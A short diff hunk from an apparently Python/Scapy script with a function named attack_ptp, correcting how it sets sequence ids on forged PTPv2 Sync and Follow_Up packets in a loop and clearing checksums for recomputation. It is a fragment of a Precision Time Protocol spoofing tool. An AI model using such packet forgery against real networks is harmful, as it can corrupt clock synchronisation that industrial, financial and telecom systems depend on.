@@ -37,7 +37,7 @@ def attack_ptp():
 
     for i in range(10):
         sequence_id+=1
-        sync_packet.sequenceId = sequence_id
+        sync_packet[PTPv2].sequenceId = sequence_id
         follow_up_packet[PTPv2].sequenceId = sequence_id
         del(sync_packet.getlayer(IP).chksum) 
         del(sync_packet.getlayer(UDP).chksum)
